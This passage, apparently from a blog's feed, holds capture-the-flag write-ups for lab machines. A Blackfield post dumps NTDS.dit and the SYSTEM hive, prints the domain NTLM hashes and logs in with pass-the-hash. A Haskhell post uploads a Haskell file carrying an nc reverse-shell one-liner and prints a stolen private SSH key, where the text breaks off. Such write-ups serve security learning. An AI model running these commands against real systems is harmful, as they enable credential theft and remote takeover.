<h3 id="having-only-ntdsdit-is-not-going-to-help-so-i-need-one-more-file-ie-system">Having only <code class="language-plaintext highlighter-rouge">NTDS.dit</code> is not going to help, so i need one more file ie <code class="language-plaintext highlighter-rouge">SYSTEM</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span>\<span class="n">system</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span>\<span class="n">system</span><span class="p">.</span><span class="n">bak</span>
<span class="n">The</span> <span class="n">operation</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>

<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">ls</span>


    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span>


<span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
<span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>            <span class="mi">628</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">11_14</span><span class="o">-</span><span class="mi">44</span><span class="o">-</span><span class="mi">35</span><span class="n">_DC01</span><span class="p">.</span><span class="n">cab</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>             <span class="mi">90</span> <span class="n">jeevan</span><span class="p">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">1</span><span class="p">:</span><span class="mi">13</span> <span class="n">PM</span>         <span class="mi">135470</span> <span class="n">MpCmdRun</span><span class="p">.</span><span class="n">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">56</span> <span class="n">PM</span>       <span class="mi">18874368</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="n">PM</span>          <span class="mi">12288</span> <span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="n">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="n">PM</span>          <span class="mi">16384</span> <span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="n">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="n">PM</span>            <span class="mi">102</span> <span class="n">silconfig</span><span class="p">.</span><span class="n">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">01</span> <span class="n">PM</span>       <span class="mi">17346560</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="n">PM</span>          <span class="mi">63072</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmsvc</span><span class="p">.</span><span class="n">log</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="n">PM</span>          <span class="mi">15832</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmusr</span><span class="p">.</span><span class="n">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="n">PM</span>           <span class="mi">1728</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmvss</span><span class="p">.</span><span class="n">log</span>


<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> 
</code></pre></div></div>
<h3 id="as-ive-got-both-the-required-files-now-its-time-to-download-the-files-to-dump-secrets">As I’ve got both the required files, now its time to download the files to dump <code class="language-plaintext highlighter-rouge">secrets</code>..</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Temp</span><span class="o">&gt;</span> <span class="n">download</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span>
<span class="n">Info</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Temp</span>\<span class="n">ndts</span><span class="p">.</span><span class="n">dit</span> <span class="n">to</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span>

<span class="n">Progress</span><span class="p">:</span> <span class="mi">11</span><span class="o">%</span> <span class="p">:</span> <span class="o">|</span><span class="err">▒░░░░░░░░░</span><span class="o">|</span> 


<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">download</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span>
<span class="n">Info</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span>\<span class="n">system</span><span class="p">.</span><span class="n">bak</span> <span class="n">to</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span>

<span class="n">Progress</span><span class="p">:</span> <span class="mi">6</span><span class="o">%</span> <span class="p">:</span> <span class="o">|</span><span class="err">▒░░░░░░░░░░</span><span class="o">|</span>        
</code></pre></div></div>
<h4 id="wait-till-the-procress-is-completed">Wait till the procress is completed.</h4>

<h2 id="dumping-ntlm">Dumping <code class="language-plaintext highlighter-rouge">NTLM</code></h2>

<h2 id="using-impacket-for-secretdump">Using <code class="language-plaintext highlighter-rouge">impacket</code> for <code class="language-plaintext highlighter-rouge">secretdump</code></h2>

<h3 id="secretsdumppy--ntds-ntdsdit--system-systembak-local"><code class="language-plaintext highlighter-rouge">secretsdump.py -ntds ntds.dit -system system.bak LOCAL</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span>  <span class="o">-</span><span class="n">ntds</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span> <span class="o">-</span><span class="n">system</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span> <span class="n">LOCAL</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="p">.</span><span class="mf">9.22</span><span class="p">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20200611.111621</span><span class="p">.</span><span class="mi">760</span><span class="n">cb1ea</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2020</span> <span class="n">SecureAuth</span> <span class="n">Corporation</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">system</span> <span class="n">bootKey</span><span class="p">:</span> <span class="mh">0x73d83e56de8961ca9f243e1a49638393</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="nc">Credentials </span><span class="p">(</span><span class="n">domain</span>\<span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">pekList</span><span class="p">,</span> <span class="n">be</span> <span class="n">patient</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">PEK</span> <span class="c1"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Reading</span> <span class="ow">and</span> <span class="n">decrypting</span> <span class="n">hashes</span> <span class="k">from</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span> 
<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">184</span><span class="n">fb5e5178480be64824d4cd53b99ee</span><span class="p">:::</span>
<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
<span class="n">DC01</span><span class="err">$</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">65557</span><span class="n">f7ad03ac340a7eb12b9462f80d6</span><span class="p">:::</span>
<span class="n">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">d3c02561bba6ee4ad6cfd024ec8fda5d</span><span class="p">:::</span>
<span class="n">audit2020</span><span class="p">:</span><span class="mi">1103</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">c95ac94a048e7c29ac4b4320d7c9d3b5</span><span class="p">:::</span>
<span class="n">support</span><span class="p">:</span><span class="mi">1104</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">cead107bf11ebc28b3e6e90cde6de212</span><span class="p">:::</span>
<span class="n">BLACKFIELD</span><span class="p">.</span><span class="n">local</span>\<span class="n">BLACKFIELD764430</span><span class="p">:</span><span class="mi">1105</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">a658dd0c98e7ac3f46cca81ed6762d1c</span><span class="p">:::</span>
<span class="n">BLACKFIELD</span><span class="p">.</span><span class="n">local</span>\<span class="n">BLACKFIELD538365</span><span class="p">:</span><span class="mi">1106</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">a658dd0c98e7ac3f46cca81ed6762d1c</span><span class="p">:::</span>
</code></pre></div></div>
<h3 id="time-to-get-root-access">Time to get root access</h3>

<h2 id="getting-roottxt">Getting Root.txt</h2>

<p><code>evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u Administrator -i blackfiled.htb</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">root</span><span class="nd">@Ac3</span><span class="p">:</span><span class="o">~</span><span class="c1"># evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u administrator -i blackfiled.htb
</span>
<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v2</span><span class="p">.</span><span class="mi">3</span>

<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>

<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="p">..</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">Desktop</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
<span class="mi">4375</span><span class="n">a</span><span class="o">------------------------</span><span class="mi">5</span><span class="n">cb</span>
</code></pre></div></div>

<hr />

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>jeevan</name></author><category term="[&quot;hackthebox&quot;, &quot;retired&quot;]" /><category term="windows" /><category term="activedirectory" /><category term="evilwinrm" /><category term="smb" /><category term="rpcclient" /><category term="mimikatz" /><category term="lsass" /><category term="impacket" /><category term="hashcat" /><summary type="html"><![CDATA[Blackfiled is a HTB active machine at present. This is completely based on enumeration which will lead our way in. This is one of the best windows machine I've enjoyed doing it.]]></summary></entry><entry><title type="html">Tryhackme Haskhell</title><link href="http://localhost:4000/tryhackme/2020/07/08/Haskhell.html" rel="alternate" type="text/html" title="Tryhackme Haskhell" /><published>2020-07-08T15:04:00+05:30</published><updated>2020-07-08T15:04:00+05:30</updated><id>http://localhost:4000/tryhackme/2020/07/08/Haskhell</id><content type="html" xml:base="http://localhost:4000/tryhackme/2020/07/08/Haskhell.html"><![CDATA[<h2 id="lets-get-started">Let’s get started</h2>

<h2 id="nmap-scan">Nmap Scan.</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">-</span><span class="no">T4</span> <span class="n">hask</span><span class="p">.</span><span class="nf">thm</span> 
<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">08</span> <span class="mo">03</span><span class="p">:</span><span class="mi">30</span> <span class="no">EDT</span>
<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">hask</span><span class="p">.</span><span class="nf">thm</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">129.213</span><span class="p">)</span>
<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.16</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">65533</span> <span class="n">closed</span> <span class="n">ports</span>
<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mf">7.6</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey: 
</span><span class="o">|</span>   <span class="mi">2048</span> <span class="mi">1</span><span class="n">d</span><span class="ss">:f3</span><span class="p">:</span><span class="mi">53</span><span class="ss">:f7</span><span class="p">:</span><span class="mi">6</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="ss">:a1:d4</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="ss">:dd</span><span class="p">:</span><span class="mi">66</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">4</span><span class="n">d</span><span class="p">:</span><span class="mi">90</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">26</span><span class="p">:</span><span class="mi">7</span><span class="n">c</span><span class="ss">:bd</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">8</span><span class="n">f</span><span class="ss">:bf</span><span class="p">:</span><span class="mi">09</span><span class="ss">:ac</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="ss">:e3:d3</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="ss">:c3</span><span class="p">:</span><span class="mi">34</span><span class="ss">:bc</span><span class="p">:</span><span class="mi">14</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">d5</span><span class="ss">:fb</span><span class="p">:</span><span class="mi">55</span><span class="ss">:a0:fd:e8:e1:ab</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="p">:</span><span class="mi">46</span><span class="ss">:af:b8</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="mi">90</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">26</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
<span class="mi">5001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Gunicorn</span> <span class="mf">19.7</span><span class="o">.</span><span class="mi">1</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="n">gunicorn</span><span class="o">/</span><span class="mf">19.7</span><span class="o">.</span><span class="mi">1</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Homepage</span>
<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:linux:linux_kernel</span>

<span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">657.29</span> <span class="n">seconds</span>
</code></pre></div></div>

<h3 id="from-the-nmap-scan-i-can-see-that-port-5001-is-the-only-useful-port-that-can-be-enumerated">From the <code class="language-plaintext highlighter-rouge">Nmap</code> scan I can see that port <code class="language-plaintext highlighter-rouge">5001</code> is the only useful port that can be enumerated.</h3>

<p>Having a look on the http site @ 5001 I come to see this page</p>

<p><img src="/assets/img/sample/hask/hask1.jpg" alt="" /></p>

<p>Seeing the hyperlink <code class="language-plaintext highlighter-rouge">homework here</code> I clicked on it and it took me to the page where an assignment can be submitted.</p>

<p><img src="/assets/img/sample/hask/hask2.png" alt="" /></p>

<h3 id="clicking-on-the-submit-button-it-says-that-page-not-found">Clicking on the submit button it says that <code class="language-plaintext highlighter-rouge">PAGE NOT FOUND</code>.</h3>

<p><img src="/assets/img/sample/hask/hask3.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">Gobuster</code> to find the directories of the machine.</p>

<h2 id="gobuster">Gobuster</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Ac3:~# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://hask.thm:5001/ <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt 
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://hask.thm:5001/
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /usr/share/dirb/wordlists/common.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/07/08 03:33:08 Starting gobuster
<span class="o">===============================================================</span>
/submit <span class="o">(</span>Status: 200<span class="o">)</span>
<span class="o">===============================================================</span>
2020/07/08 03:36:03 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<h3 id="so-its-not-uploads-but-its-submit">So it’s not <code class="language-plaintext highlighter-rouge">uploads</code> but it’s <code class="language-plaintext highlighter-rouge">Submit</code>.</h3>

<h3 id="tried-a-bunch-of-stuff-like-uploading-a-php-shell-and-stuff-like-that-but-nothing-seems-to-be-working">Tried a bunch of stuff like uploading a <code class="language-plaintext highlighter-rouge">PHP</code> shell and stuff like that, but nothing seems to be working.</h3>

<p><img src="/assets/img/sample/hask/hask4.png" alt="" /></p>

<h3 id="remembering-from-previous-pages-this-site-probably-accepts-a-haskell-scripts">Remembering from previous pages this site probably accepts a haskell scripts.</h3>

<h2 id="reverse-shell">Reverse shell</h2>

<h3 id="a-little-bit-research-on-haskell-i-found-that-we-can-call-a-command-using-the-below-script">A little bit research on haskell I found that we can call a command using the below script.</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="nd">@Ac3</span><span class="p">:</span><span class="o">~/</span><span class="n">Haskhell</span><span class="c1"># cat shell.hs 
</span><span class="n">module</span> <span class="n">Main</span> <span class="n">where</span>

<span class="kn">import</span> <span class="n">System.Process</span>

<span class="n">main</span> <span class="o">=</span> <span class="n">callCommand</span> <span class="sh">"</span><span class="s">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.2.148 5566 &gt;/tmp/f</span><span class="sh">"</span>
</code></pre></div></div>

<h3 id="uploading-the-file-and-starting-up-a-listner-nc--lnvp-5566-and-visiting-the-url-haskthmuploadsshellhs-gave-me-the-reverse-shell">Uploading the file and starting up a listner <code class="language-plaintext highlighter-rouge">nc -lnvp 5566</code> and visiting the url <code class="language-plaintext highlighter-rouge">hask.thm/uploads/shell.hs</code> gave me the reverse shell.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="o">/</span><span class="no">Haskhell</span><span class="c1"># nc -lnvp 5566</span>
<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">5566</span> <span class="o">...</span>
<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.9</span><span class="o">.</span><span class="mf">2.148</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">129.213</span><span class="p">]</span> <span class="mi">44224</span>
<span class="sr">/bin/s</span><span class="ss">h: </span><span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="err">'</span><span class="n">t</span> <span class="n">access</span> <span class="n">tty</span><span class="p">;</span> <span class="n">job</span> <span class="n">control</span> <span class="n">turned</span> <span class="n">off</span>
<span class="err">$</span> <span class="nb">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flask</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flask</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flask</span><span class="p">)</span>
<span class="err">$</span> 
</code></pre></div></div>

<blockquote>
  <p>We can use <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash");'</code> for a shell upgrade.</p>
</blockquote>

<h2 id="getting-usertxt">Getting User.txt</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flask@haskhell:/home<span class="nv">$ </span><span class="nb">ls
</span>flask  haskell  prof
flask@haskhell:/home<span class="nv">$ </span>
flask@haskhell:/home<span class="nv">$ </span><span class="nb">cd </span>prof
<span class="nb">cd </span>prof
flask@haskhell:/home/prof<span class="nv">$ </span><span class="nb">ls
ls
</span>__pycache__  user.txt
flask@haskhell:/home/prof<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
flag<span class="o">{</span><span class="nt">--------------</span><span class="o">}</span>

</code></pre></div></div>
<h3 id="from-here-i-see-a-ssh-folder-which-contains-the-id_rsa-of-professor-so-i-copied-that-to-my-kali-and-used-ssh-to-login-as-prof">From here I see a <code class="language-plaintext highlighter-rouge">.ssh</code> folder which contains the <code class="language-plaintext highlighter-rouge">id_rsa</code> of professor, So I copied that to my <code class="language-plaintext highlighter-rouge">kali</code> and used <code class="language-plaintext highlighter-rouge">ssh</code> to login as <code class="language-plaintext highlighter-rouge">prof</code>.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flask</span><span class="vi">@haskhell</span><span class="ss">:/</span><span class="n">home</span><span class="o">/</span><span class="n">prof</span><span class="o">/</span><span class="p">.</span><span class="nf">ssh</span><span class="err">$</span> <span class="n">cat</span> <span class="n">id_rsa</span>
<span class="n">cat</span> <span class="n">id_rsa</span>
<span class="o">-----</span><span class="k">BEGIN</span> <span class="no">RSA</span> <span class="no">PRIVATE</span> <span class="no">KEY</span><span class="o">-----</span>
<span class="no">MIIEpAIBAAKCAQEA068E6x8</span><span class="o">/</span><span class="n">vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr</span>
<span class="mi">94</span><span class="n">rYpUPcxxxYyw</span><span class="o">/</span><span class="n">dAii0W6srQuRCAbQxO5Di</span><span class="o">+</span><span class="n">tv9aWXmBGMEt0</span><span class="o">/</span><span class="mi">3</span><span class="n">tOE7D09RhZGQ</span>
<span class="n">b68lAFDjSSJaVlVzPi</span><span class="o">+</span><span class="n">waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss</span>
<span class="no">Nb</span><span class="o">+</span><span class="mi">7</span><span class="no">UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7</span><span class="o">+</span><span class="n">iObamfGlZ4QQ5IvUj0etStDD6iU</span>
<span class="no">WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2</span><span class="o">++</span>
<span class="mi">6</span><span class="no">ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf</span><span class="o">+</span><span class="n">wQXvtrq</span>
<span class="no">XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob</span>
<span class="n">wSsR3TTTci0JIP4CQs4</span><span class="o">+</span><span class="n">nez96DNl</span><span class="o">+</span><span class="mi">6</span><span class="no">IUmhawcDfrtlGwwZ</span><span class="o">/</span><span class="no">JsvPDYujnyziN</span><span class="o">+</span><span class="no">KTr</span>
<span class="mi">7</span><span class="n">ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS</span><span class="o">/</span><span class="n">xWzW3i7F</span>
<span class="n">gAoYxc6</span><span class="o">+</span><span class="mi">4</span><span class="n">s5bKHsJima2Aj5F3XtHfipkMdBvbl</span><span class="o">+</span><span class="n">sjGllgiQn</span><span class="o">/</span><span class="n">oEjYMIX5wc7</span><span class="o">+</span><span class="n">se2</span>
